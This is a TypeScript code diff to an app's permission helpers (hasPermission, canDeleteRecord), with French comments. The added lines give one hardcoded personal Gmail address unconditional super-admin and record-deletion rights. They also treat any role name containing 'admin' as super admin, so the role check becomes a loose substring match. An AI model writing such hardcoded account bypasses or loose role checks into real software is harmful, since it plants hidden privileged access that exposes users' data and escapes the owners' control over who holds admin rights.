@@ -172,8 +172,11 @@ export function hasPermission(user: AppUser | null, moduleKey: ModuleKey): boole
   }
 
   // Primary Super Admin check
+  const userEmail = (user.email || '').trim().toLowerCase();
   const isSuperAdmin = user.role === 'Admin' ||
-    user.isSuperAdmin === true;
+    user.isSuperAdmin === true ||
+    userEmail === 'joemakkmj@gmail.com' ||
+    (typeof user.role === 'string' && user.role.toLowerCase().includes('admin'));
   
   if (isSuperAdmin) return true;
 
@@ -185,6 +188,9 @@ export function canDeleteRecord(user: AppUser | Partial<AppUser> | { role?: stri
   if (!user) return false;
   if (user.isDeleted) return false;
   if (user.hasAppAccess === false) return false;
+
+  const email = (user.email || '').trim().toLowerCase();
+  if (email === 'joemakkmj@gmail.com') return true;
 
   // 1. Tous les administrateurs ont le droit de suppression par défaut
   if (user.role === 'Admin' || user.isSuperAdmin === true || (typeof user.role === 'string' && user.role.toLowerCase().includes('admin'))) {
